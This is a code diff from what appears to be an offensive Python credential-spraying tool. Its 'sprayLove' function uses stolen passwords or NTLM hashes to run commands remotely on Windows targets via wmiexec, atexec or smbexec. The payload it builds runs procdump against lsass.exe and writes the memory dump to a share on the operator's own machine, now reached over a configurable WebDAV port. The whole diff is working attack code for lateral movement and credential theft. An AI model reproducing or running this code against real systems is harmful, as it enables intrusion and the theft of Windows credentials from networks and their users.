@@ -14,11 +14,12 @@ from core.SmbConnection import *
 from core.Colors import *
 
 
-def sprayLove(user, target, methods, share):
+def sprayLove(user, target, methods, share, port=80):
 	if not methods : methods = ['wmiexec', 'atexec', 'smbexec']
 	smb_share_name = gen_random_string(5)
 	
-	payload = "net use \\\\%s\\procdump\\ && \\\\%s\\procdump\\procdump64.exe -accepteula -ma lsass.exe \\\\%s\\dumps\\%s.dmp" % (retrieveMyIP(), retrieveMyIP(), retrieveMyIP(), target)
+	local_ip = retrieveMyIP()
+	payload = "net use \\\\%s@%s\\misc\\ & \\\\%s@%s\\misc\\procdump\\procdump64.exe -accepteula -ma lsass.exe \\\\%s@%s\\misc\\dumps\\%s.dmp" % (local_ip, port, local_ip, port, local_ip, port, target)
 	exec_method = None
 
 	for method in methods:
@@ -26,7 +27,7 @@ def sprayLove(user, target, methods, share):
 			smbConnection = SmbConnection()
 			if smbConnection.create_conn_obj(target):
 				try:	
-					exec_method = wmiexec.WMIEXEC(target, smb_share_name, user.username, user.password, user.domain, smbConnection.smbConnection, user.lmhash + ':' + user.nthash, share)
+					exec_method = wmiexec.WMIEXEC(target, smb_share_name, user.username, user.password, user.domain, smbConnection.smbConnection, hashes=user.lmhash + ':' + user.nthash, share=share, port=port)
 					logging.info("%s   %s: %swmiexec%s seems to be an %sOK%s method. let's go... " % (infoYellow, target, green, white, green, white))
 					break
 				except Exception as e:
@@ -51,7 +52,7 @@ def sprayLove(user, target, methods, share):
 
 		elif method == 'atexec':
 			try:
-				exec_method = atexec.TSCH_EXEC(target, smb_share_name, user.username, user.password, user.domain, user.lmhash + ':' + user.nthash)
+				exec_method = atexec.TSCH_EXEC(target, smb_share_name, user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, port=port)
 				logging.info("%s   %s: %satexec%s seems to be an %sOK%s method. let's go... " % (infoYellow, target, green, white, green, white))
 				break
 			except Exception as e:
@@ -61,7 +62,7 @@ def sprayLove(user, target, methods, share):
 
 		else:
 			try:
-				exec_method = smbexec.SMBEXEC(target, smb_share_name, 445, user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, share)
+				exec_method = smbexec.SMBEXEC(target, smb_share_name, 445, user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, share, webPort=port)
 				logging.info("%s   %s: %ssmbexec%s seems to be an %sOK%s method. let's go... " % (infoYellow, target, green, white, green, white))
 				break
 			except Exception as e:
